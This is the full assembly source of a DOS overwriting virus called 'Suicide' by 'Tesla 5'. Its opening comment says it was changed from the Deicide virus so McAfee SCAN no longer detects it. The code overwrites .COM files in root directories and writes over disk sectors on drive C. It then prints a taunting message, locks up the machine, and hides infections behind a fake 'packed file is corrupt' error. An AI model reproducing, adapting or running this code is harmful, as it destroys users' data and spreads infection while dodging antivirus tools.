;|
;|      SUICIDE VIRUS BY TESLA 5
;|
;|      THIS VIRUS IS A SLIGHTLY MODIFIED VERSION OF THE DEICIDE VIRUS OF
;|      GLENN BENTON, SO IT IS SMALLER IN SIZE AND A BIT MORE EFFICIENT. I
;|      THINK GLENN WAS A BIG SATANIST, BECAUSE OF THE NAME DEI-CIDE (KILL
;|      EVERYTHING THAT'S HOLY?). WELL, I MODIFIED THE CODE, SO IT IS NO
;|      MORE DETECTABLE BY SCAN OF MCAFEE. THANKS TO 'CRYPT'? AND XTSC FOR
;|      THE SOURCE CODE. GREETINGS TO ALL VIRUS WRITERS.
;|

START_PROG:     JMP SHORT START_VIRUS

MESSAGE         DB 0DH,0AH,'SUICIDE!'
                DB 0DH,0AH
                DB 0DH,0AH,'TESLA 5 SAYS : NO MORE HD!'
                DB 0DH,0AH
                DB 0DH,0AH,'NEXT TIME BE SCARED FOR ILLEGAL STUFF!$'

START_VIRUS:    MOV AH,19H
                INT 21H

                DB 0A2H
                DW OFFSET INFECT_DRIVE
                DB 0A2H
                DW OFFSET ACTUAL_DRIVE

                MOV AH,47H
                MOV DL,0
                MOV SI,OFFSET ACTUAL_DIR
                INT 21H

                MOV AH,1AH
                MOV DX,OFFSET NEW_DTA
                INT 21H

INFECT_NEXT:    MOV AH,3BH
                MOV DX,OFFSET ROOT_DIR
                INT 21H

                MOV AH,4EH
                MOV CX,0
                MOV DX,OFFSET SEARCH_PATH
                INT 21H

CHECK_COMMAND:  MOV AL,'N'
                CMP [NEW_DTA+23H],AL
                JNZ CHECK_INFECT
                JMP SHORT SEARCH_NEXT
                NOP

CHECK_INFECT:   MOV AX,3D02H
                MOV DX,OFFSET NEW_DTA+1EH
                INT 21H
                MOV FILE_HANDLE,AX
                XCHG BX,AX

                MOV AX,5700H
                INT 21H
                MOV FILE_DATE,DX
                MOV FILE_TIME,CX

                CALL GO_BEG_FILE

                MOV AH,3FH
                MOV CX,2
                MOV DX,OFFSET READ_BUF
                INT 21H

                MOV AL,BYTE PTR [READ_BUF+1]
                CMP AL,OFFSET START_VIRUS-102H
                JNZ INFECT

                MOV AH,3EH
                INT 21H

SEARCH_NEXT:    MOV AH,4FH
                INT 21H
                JNC CHECK_COMMAND

                MOV AL,INFECT_DRIVE
                CMP AL,0
                JNZ NO_A_DRIVE
                INC AL
NO_A_DRIVE:     INC AL
                CMP AL,3
                JNZ NO_DESTROY

                XOR BX,BX
                MOV AL,2
                MOV DX,BX
                MOV CX,40H
                INT 26H

                MOV AH,9
                MOV DX,OFFSET MESSAGE
                INT 21H

LOCK_SYSTEM:    CLI
                JMP SHORT LOCK_SYSTEM

NO_DESTROY:
                MOV AH,0EH
                MOV DL,AL
                MOV INFECT_DRIVE,DL
                INT 21H

                JMP INFECT_NEXT

INFECT:         CALL GO_BEG_FILE

                MOV AH,40H
                MOV DX,100H
                MOV CX,OFFSET END_VIRUS-100H
                INT 21H

                MOV AX,5701H
                MOV CX,FILE_TIME
                MOV DX,FILE_DATE
                INT 21H

                MOV AH,3EH
                INT 21H

                MOV DL,BYTE PTR [ACTUAL_DRIVE]
                MOV AH,0EH
                INT 21H

                MOV AH,3BH
                MOV DX,OFFSET ACTUAL_DIR
                INT 21H

                MOV AH,9
                MOV DX,OFFSET QUIT_MESSAGE
                INT 21H

                INT 20H

GO_BEG_FILE:    MOV AX,4200
                XOR CX,CX
                XOR DX,DX
                INT 21H
                RET


FILE_DATE       DW (?)
FILE_TIME       DW (?)

FILE_HANDLE     DW (?)

INFECT_DRIVE    DB (?)

ROOT_DIR        DB '\',0

SEARCH_PATH     DB '*.COM',0

READ_BUF        DB 2 DUP (?)

ACTUAL_DRIVE    DB (?)

QUIT_MESSAGE    DB 'PACKED FILE IS CORRUPT',0DH,0AH,'$'

NEW_DTA         DB 2BH DUP (?)

ACTUAL_DIR      DB 40H DUP (?)

END_VIRUS:
